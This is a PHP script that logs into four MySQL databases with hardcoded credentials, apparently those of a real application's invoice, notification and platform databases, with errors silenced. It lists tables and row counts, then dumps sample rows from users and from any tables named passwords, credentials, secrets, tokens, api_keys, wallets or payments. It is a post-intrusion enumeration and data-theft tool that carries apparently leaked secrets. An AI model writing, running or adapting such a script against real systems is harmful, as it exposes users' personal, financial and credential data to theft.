<?php
error_reporting(0);

$databases = [
    ['invoice_explicador_2021_skddj34nbdu98udfd', 'invoice_explic4nbdu98udfd', 'invoice_explicador_2021_skddj34nbdu98udfd'],
    ['explicadorPlataform54321', 'explicadorPlataform54321', 'explicadorPlataform54321'],
    ['e_notifications_db_2020', 'e_notifications_db_2020', 'e_notifications_db_2020$$wewel343ft430iddmnms34df56u6h'],
    ['explicadorlives', 'explicadorlives', 'explicadorlives'],
];

foreach ($databases as $db) {
    $dbname = $db[0];
    $user = $db[1];
    $pass = $db[2];
    
    echo "\n\n========== DATABASE: $dbname ==========\n";
    try {
        $pdo = new PDO("mysql:host=127.0.0.1;port=3306;dbname=$dbname;charset=utf8", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Show tables
        echo "--- TABLES ---\n";
        $tables = $pdo->query('SHOW TABLES')->fetchAll(PDO::FETCH_COLUMN);
        echo implode(', ', $tables) . "\n";
        
        // Count rows in key tables
        foreach ($tables as $t) {
            try {
                $cnt = $pdo->query("SELECT COUNT(*) FROM `$t`")->fetchColumn();
                if ($cnt > 0) {
                    echo "  $t: $cnt rows\n";
                }
            } catch (Exception $e) {}
        }
        
        // Check for users table
        if (in_array('users', $tables)) {
            echo "--- USERS (SAMPLE) ---\n";
            $rows = $pdo->query('SELECT * FROM users LIMIT 3')->fetchAll(PDO::FETCH_ASSOC);
            foreach ($rows as $r) {
                echo json_encode($r, JSON_UNESCAPED_UNICODE) . "\n";
            }
        }
        
        // Check for sensitive tables
        $sensitive = ['passwords', 'credentials', 'secrets', 'tokens', 'api_keys', 'wallets', 'payments', 'transactions', 'orders', 'invoices', 'settings', 'configurations'];
        foreach ($sensitive as $st) {
            if (in_array($st, $tables)) {
                echo "--- $st (SAMPLE) ---\n";
                $rows = $pdo->query("SELECT * FROM `$st` LIMIT 2")->fetchAll(PDO::FETCH_ASSOC);
                foreach ($rows as $r) {
                    echo json_encode($r, JSON_UNESCAPED_UNICODE) . "\n";
                }
            }
        }
        
    } catch (Exception $e) {
        echo "ERROR: " . $e->getMessage() . "\n";
    }
}
?>
